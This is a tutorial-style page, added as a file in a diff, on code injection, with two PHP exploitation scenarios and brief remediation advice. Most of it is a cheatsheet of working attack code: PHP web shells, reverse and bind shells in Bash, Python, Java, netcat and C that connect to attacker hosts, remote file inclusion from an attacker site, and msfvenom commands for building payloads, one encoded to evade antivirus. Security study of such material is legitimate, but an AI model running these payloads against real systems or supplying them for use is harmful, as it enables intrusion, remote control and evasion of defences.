@@ -1,0 +1,143 @@
+What is Code Injection
+
+OWASP defines Code Injection as a general term for any attack type that consists of injecting code that is then interpreted and executed by the application. This type of attack exploits the poor handling of untrusted data. These types of attacks are usually made possible due to a lack of proper input/output data validation such as:
+
+    allowed characters (standard regular expressions classes or custom)
+    data format
+    amount of expected data
+
+Code Injection differs from Command Injection in that an attacker is limited only by the functionality of the injected language itself. If an attacker can inject and execute PHP code into an application, then they are only limited by the capabilities of PHP. Command injection consists of leveraging existing code to execute commands, usually within the context of a shell.
+How Does It Work?
+Scenario 1: PHP include() function
+
+In this scenario, the PHP include() function is in use with no input validation.
+
+http://vulnerable-site.com/?path=support.php
+
+To exploit the vulnerability, we will be storing our payload in an external server to call the external file and execute on the vulnerable server:
+
+http://vulnerable-site.com/?path=http://attacker-website/paylaod.php
+
+Scenario 2: PHP eval() function
+
+In this example, the vulnerable PHP eval() function is in use which provides a quick and convenient way of executing string values as PHP code, especially in the initial phases of development or for debugging which will cause the code injection. The source code looks like the following:
+
+<?php eval ("echo ".$_REQUEST["parameter"].";"); ?>
+
+The parameter is being passed to the URL as the following:
+
+http://vulnerable-site.com/?parameter=value
+
+An attacker who is aware of eval() function in use (can be revealed via error messages) can send the following payload to exploit the vulnerability:
+
+http://vulnerable-site.com/?parameter=value;phpinfo();
+
+If successful, phpinfo() will be executed after ‘echo’ing the parameter value and will provide information about the configuration details.
+
+Moreover, in case system() function is also enabled, this can allow the attacker to execute arbitrary commands as below:
+
+http://vulnerable-site.com/?parameter=value;system('ls -l');
+
+What’s the Impact of Code Injection
+
+In case the malicious code of the user input is processed unsafely, the vulnerability allows execution of the code. This can lead to arbitrary code execution on the server or to run system commands on the server which leads to command injection attacks. Based on the current privileges, the attack can result in gaining an interactive shell on the vulnerable system.
+Code Injection Cheatsheet
+
+--------------------------------------------------------------------     
+php: 
+# Execute one command
+<?php system("whoami"); ?>
+<?php echo shell_exec("nc.exe -nlvp 4444 -C:\Windows\System32\cmd.exe");?>
+# Take input from the url paramter. shell.php?cmd=whoami
+<?php system($_GET['cmd']); ?>
+<?php echo shell_exec($_GET["cmd"]); ?>
+<? passthru($_GET["cmd"]); ?>
+php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+<?php $c=$_GET[‘c’]; echo `$c`; ?>
+# The same but using passthru
+<?php passthru($_GET['cmd']); ?>
+# For shell_exec to output the result you need to echo it
+<?php echo shell_exec("whoami");?>
+# preg_replace(). This is a cool trick
+<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
+# Using backticks
+<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>
+# Using backticks
+<?php echo `whoami`; ?>
+# upload nc.php
+<?php echo system("nc -lvp 81 -e cmd.exe");?>
+# upload nc.exe
+# run nc.php on browser
+--------------------------------------------------------------------
+Bash:
+0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+bash -i >& /dev/tcp/<your ip>/<your port> 0>&1
+nc -nlvp 443
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> <your port> >/tmp/f
+--------------------------------------------------------------------
+python:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.0.0.1",1234));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+--------------------------------------------------------------------
+Java:
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+--------------------------------------------------------------------netcat:
+# netcat bind shell
+nc -vlp 5555 -e /bin/bash
+nc 192.168.1.101 5555
+# netcat reverse shell
+nc -lvp 5555
+nc 192.168.1.101 5555 -e /bin/bash
+# With -e flag
+nc -e /bin/sh <your ip> <your port>
+# Without -e flag
+rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+--------------------------------------------------------------------C
+#include <stdlib.h>
+int main () {
+system("nc.exe -e cmd.exe <myip> <myport>");
+return 0;
+}
+--------------------------------------------------------------------
+
+Msfvenom
+
+--------------------------------------------------------------------
+Msfvenom: 
+msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -o shell_reverse.exe
+--------------------------------------------------------------------to avoid AV detection, use encryption:
+msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+--------------------------------------------------------------------php:
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.php
+--------------------------------------------------------------------
+asp: 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<your port> -f asp > shell.asp
+--------------------------------------------------------------------war:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f war > shell.war
+--------------------------------------------------------------------JSP:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.jsp
+--------------------------------------------------------------------binary:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
+--------------------------------------------------------------------List linux meterpreter payloads:
+msfvenom --list | grep xxxx
+--------------------------------------------------------------------Send linux shell to meterpreter:
+msfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf -o msf.bin (set multi handler then)
+--------------------------------------------------------------------
+
+Remediation
+
+To avoid and remediate code injection you can do the following:
+
+    Validation/Sanitization on User Input: Data from all potentially untrusted sources should be subject to input validation, including not only Internet-facing web clients but also backend feeds over extranets, from suppliers, partners, vendors or regulators, each of which may be compromised on their own and start sending malformed data.
+    Avoid using vulnerable functions in the code: It’s also possible to test the code using automated tools to identify unsafe functions and possible vulnerabilities.
+    PS: Commonly disabled functions for PHP include: exec(), passthru(), shell_exec(), system(), proc_open(), popen(), curl_exec(), curl_multi_exec(), parse_ini_file(), and show_source().
